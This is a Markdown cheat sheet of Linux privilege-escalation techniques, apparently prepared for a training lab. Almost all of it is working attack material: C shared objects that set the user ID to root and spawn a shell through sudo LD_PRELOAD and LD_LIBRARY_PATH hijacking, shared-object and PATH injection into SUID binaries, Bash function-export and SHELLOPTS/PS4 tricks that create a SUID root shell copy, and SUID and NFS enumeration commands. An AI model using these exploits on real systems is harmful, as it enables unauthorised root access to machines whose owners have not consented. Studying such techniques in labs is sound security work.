# Linux PrivEsc
## SUDO LD_LIBRARY_PATH library_path.c
1. 
```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```
2. `ldd /usr/sbin/apache2`
3. `gcc -o /tmp/libcrypt.so.1 -shared -fPIC home/user/tools/sudo/library_path.c`
4. `sudo LD_LIBRARY_PATH=/tmp apache2`

## SUDO LD_PRELOAD preload.c
1. 
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```
2. `gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c`
3. `sudo LD\_PRELOAD=/tmp/preload.so program-name-here`
## Find SUID/SGID binaries
`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
## Enumerating versions
1. `<program> --version` or `<program>-v`
2. `dpkg -l | grep <program>`
3. `rpm --qa | grep <program>`

## Shared objects injection in SUID/SGID binaries
1. 
`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`
2. 
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}
```
3. `gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`
## PATH env injection in SUID/SGID binaries
1. `strings /path/to/file`
2. `strace -v -f -e execve <command> 2>&1 | grep exec`
3. `ltrace <command>`
4. 
```
int main() {
	setuid(0);
	system("/bin/bash -p");
}
```
5. `gcc -o service /home/user/tools/suid/service.c`
6. `PATH=.:$PATH /usr/local/bin/suid-env`
## Abuse Bash<4.2-048 with SUID/SGID binaries having exact path of another binary
```
function /usr/sbin/service { /bin/bash -p; }  
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```
## Abuse Bash<4.4 with SUID/SGID binaries
```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```
## NFS
1. Enumerate NFS
	- `showmount -e <target>`
	- `nmap -sV -script=nfs-showmount <target>`
	- `cat /etc/exports`
2. Mount
	- `mount -o rw,vers=2 <target>L<share> <local_dir>`

